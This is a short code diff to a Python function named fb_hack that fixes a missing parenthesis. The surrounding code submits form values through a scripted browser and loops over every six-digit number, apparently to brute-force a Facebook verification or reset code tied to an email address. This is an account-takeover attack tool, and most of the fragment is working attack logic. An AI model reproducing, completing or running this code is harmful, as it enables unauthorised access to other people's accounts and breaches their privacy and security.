@@ -85,7 +85,7 @@ def fb_hack(email, codex):
       browser.select_form(nr=0)
       browser.set_value(str(y), nr=5)
       browser.submit()
-      sleepy(30
+      sleepy(30)
     for combination in itertools.product(range(10), repeat=6):
       y = str(''.join(map(str, combination)))
       print(y)
